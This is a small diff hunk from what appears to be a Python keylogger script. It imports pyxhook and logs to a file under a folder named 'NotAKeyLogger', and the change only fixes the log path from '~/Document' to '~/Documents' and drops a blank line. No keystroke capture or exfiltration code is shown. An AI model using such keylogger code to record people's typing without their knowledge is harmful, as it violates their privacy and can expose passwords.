@@ -4,9 +4,8 @@ import pyxhook
 
 log_file = os.environ.get( 
 	'pylogger_file', 
-	os.path.expanduser('~/Document/NotAKeyLogger/file.log') 
+	os.path.expanduser('~/Documents/NotAKeyLogger/file.log') 
 ) 
-
 
 if os.environ.get('pylogger_clean', None) is not None: 
 	try: 
